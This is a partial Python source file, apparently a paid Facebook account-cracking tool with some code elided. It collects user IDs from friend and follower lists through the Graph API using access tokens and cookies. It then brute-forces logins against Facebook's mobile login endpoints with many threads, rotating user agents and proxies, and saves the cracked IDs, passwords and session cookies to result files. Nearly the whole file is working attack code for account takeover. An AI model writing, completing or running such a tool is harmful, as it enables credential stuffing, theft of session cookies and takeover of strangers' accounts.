#Author   :AK BRAND
#Facebook :https://www.facebook.com/profile.php?id=100091869295293
#GitHub.  :https://github.com/00AkBrand
#Status   :Paid (✓rs 500)
...
pretty.install()
CON=sol()
#------------------[ USER    -AGENT ]----------pwv.append(frs+lst+'@123)--------#
ugen2=[]
ugen=[]
cokbrut=[]
...
def login_lagi334():
	try:
		...
		print(f'  {u}[{h}â€¢{u}]{h} LOGIN DONEðŸ˜.........Press Enter: python Akv7.py{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tYOUR ID INFORMATION: [green]%s[purple] (AK Brand)'%(my_name)))
	...
	if _____cowok__pink_____ in ['F','f']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100091869295293 ")
		...
		back()
def error():
	print(f'{k}Sorry, Plz Choose the Right One {u}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('Result OK IdotN ')
	print('Result CP Idot ')
	print('Return ')
	kz = input('\nChoose : ')
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('Choose the correct one lol ')
				exit()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('ENTER LIMIT ID?(MAX-200-ID): '))
	except ValueError:
		print('{k}WRONG TYPE  ')
		exit()
	if jum<1 or jum>15:
	...
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(50000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			...
			print('{k}Signal Low cake contoll ')
			exit()
	try:
		print('')
		print(f'{k}Total Id Collectedâ˜…{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print('Signal Low cake contol ')
		back()
	except (KeyError,IOError):
		print(f'{k} Friendship Not Public {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
def crack_file():
	try:vin = os.listdir('DUMP')
		...
		back()
	if len(vin)==0:
		print('You Dont Have Files Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		...
		try:geh = lol[geeh]
			...
			print(f'{k}Choose the Right Cock {u}')
			time.sleep(3)
			back()
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]         WHICH ACCOUNT YOU WANT â€¢ [/bold cyan]'))
	print('') 
	cetak(nel('[bold green]1.  Old Account  \nðŸ‡®ðŸ‡©âž£2. New Account \n3. MIX IDZ (NEW/OLD)=>RECOMEND     [bold green]'))
	print('')
	hu = input(' Choose : ')
	if hu in ['1','01']:
		...
		print('Choose the Right Option ')
		exit()
	cetak(nel('\t[bold cyan]    METHODE LOGIN â€¢ [/bold cyan]'))
	print('') 
	cetak(nel('[bold purple]1. Mobile(BEST)\n2. Mbasic\n3. Touch\n4. Mtouch [bold purple]')) 
	print('')
	hc = input('>> Choose : ')
	if hc in ['1','01']:
...
#		method.append('touch')
		...
		method.append('mobile')
	print(f'{m}NOTE :\n{k}RECOMMENDED NOT SHOWING THE APPLICATION\nðŸŽ€RECOMMENDED TO USE A DEPAULT PASSWORD ') 
	print('')
...
#-------------------[ WORDLIST-SECTIOM ]------------#
def passwrd():
	cetak(nel('[bold cyan]               HAPPY WAITING FOR THE RESULTS, GOOD LUCK [bold cyan]')) 
	print(f'                    {m}N {k}A {h}Y {u}A {b}N {u}  â˜…  {b}E {u}N {h} J{k} O{m} Y{b}')
	print('')
	print(f'âž¥âž¥âž£Result  {h}OK{u} Save In : {h}OK Idot/%s {b}'%(okc))
	print(f'âž¥âž¥âž£Result {k}CP{h} Save In : {k}CP Idot/%s {b}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,mbasic,idf,pwv)
	print('')
	cetak(nel('\t[purple][green] Crack Done[purple] <<[green] '))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}Ak-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]”{P}[{H}{ok}{P}]”{P}[{k}{cp}{x}]”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      ðŸŽ€ðŸ˜˜ðŸ˜HELLO THIS Ak[green]')) 
				print(f'\r{H} Idot\n Status :ACTIVE\n UID :{idf}\n PASSWORD:{pw}\n COOKIES :{kuki}\n{ua}{N}')
				open('OK Ak/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]â€”{P}[{H}{ok}{P}]”{P}[{k}{cp}{x}]”[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]      ID KO KAAM XAINA YRR '))
				print(f'\r{K} \n Status :Get Approval\n UID :{idf}\n PASSWORD:{pw}\n{N}')     
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      HELLO THIS Ak[purple]')) 
				print(f'\r{H} Ak\n Status :ACTIVE\n UID :{idf}\n PASSWORD:{pw}\n COOKIES :{kuki}\n{ua}{N}')
				open('OK Idot/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/Ak/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='Ak OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/Ak/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]Idot OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='Ak  CP'))
					open('/sdcard/Ak' ,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/Ak' ,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f' ID       : {idf}\nPASSWORD : {pw}\n COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK AK '))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
